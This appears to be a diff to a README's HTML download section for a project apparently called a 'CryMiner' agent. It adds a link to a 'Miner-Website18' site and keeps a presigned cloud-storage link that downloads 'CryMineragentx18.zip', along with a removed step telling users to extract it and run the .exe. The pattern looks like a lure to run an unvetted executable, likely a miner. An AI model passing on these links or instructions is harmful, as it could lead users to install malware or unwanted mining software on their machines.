@@ -43,12 +43,13 @@ Contributions welcome! Follow Contributing Guidelines to get involved.
                     </ul>
                 </li>
                 <li><strong>Option 2: Website</strong>
-                        <li>Extract the zip file and run the .exe.</li>
-                    </ul>
+                     <ul>
+                       <li>[ <a href="https://unknown18-afk.github.io/Miner-Website18/style="color: blue;">Click here</a> ] to visit the website
+                     </ul>
                 </li>
                 <li><strong>Option 3: Direct Link</strong></li>
                       <ul>
-                        <li>[ <a href="https://upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage.com/G7aQ1QN9IJNOlAHKQLkucXD4gVI3/b7a63ab0-ddf9-426f-a0da-09ff5957345f?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=cdd12e35bbd220303957dc5603a4cc8e%2F20240628%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20240628T151931Z&X-Amz-Expires=43200&X-Amz-Signature=1bdd6ada20b08d6be53054cf04d64d774a6c49a19dbe7f33a59e7e433e01a505&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3D%22CryMineragentx18.zip%22"style="color: blue;">Click here</a> ] to download the zip file.</li>
+                        <li>[ <a href="https://upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage.com/G7aQ1QN9IJNOlAHKQLkucXD4gVI3/b7a63ab0-ddf9-426f-a0da-09ff5957345f?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=cdd12e35bbd220303957dc5603a4cc8e%2F20240628%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20240628T151931Z&X-Amz-Expires=43200&X-Amz-Signature=1bdd6ada20b08d6be53054cf04d64d774a6c49a19dbe7f33a59e7e433e01a505&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3D%22CryMineragentx18.zip%22"style="color: blue;">Click here</a> ] to download the zip file directly.</li>
                       </ul>
 
 **Made By:-**
